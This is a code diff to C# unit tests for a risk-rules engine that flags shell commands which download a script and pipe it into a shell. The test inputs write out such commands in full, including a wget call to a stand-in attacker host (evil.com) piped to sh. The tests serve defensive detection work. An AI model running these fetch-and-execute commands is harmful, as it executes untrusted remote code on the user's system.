@@ -84,7 +84,23 @@ public sealed class DefaultRiskRulesTests
     {
         var session = CreateSessionWithCommand("curl https://example.com/install.sh | bash");
         var warnings = _rules.Evaluate(session);
-        Assert.Contains(warnings, w => w.Code == "SUSPICIOUS_COMMAND");
+        Assert.Contains(warnings, w => w.Code == "NETWORK_SCRIPT_EXEC");
+    }
+
+    [Fact]
+    public void Evaluate_warns_for_wget_pipe_sh()
+    {
+        var session = CreateSessionWithCommand("wget -O- http://evil.com/script | sh");
+        var warnings = _rules.Evaluate(session);
+        Assert.Contains(warnings, w => w.Code == "NETWORK_SCRIPT_EXEC");
+    }
+
+    [Fact]
+    public void Evaluate_curl_without_pipe_to_shell_is_not_network_exec()
+    {
+        var session = CreateSessionWithCommand("curl -o file.zip https://example.com/file.zip");
+        var warnings = _rules.Evaluate(session);
+        Assert.DoesNotContain(warnings, w => w.Code == "NETWORK_SCRIPT_EXEC");
     }
 
     [Fact]
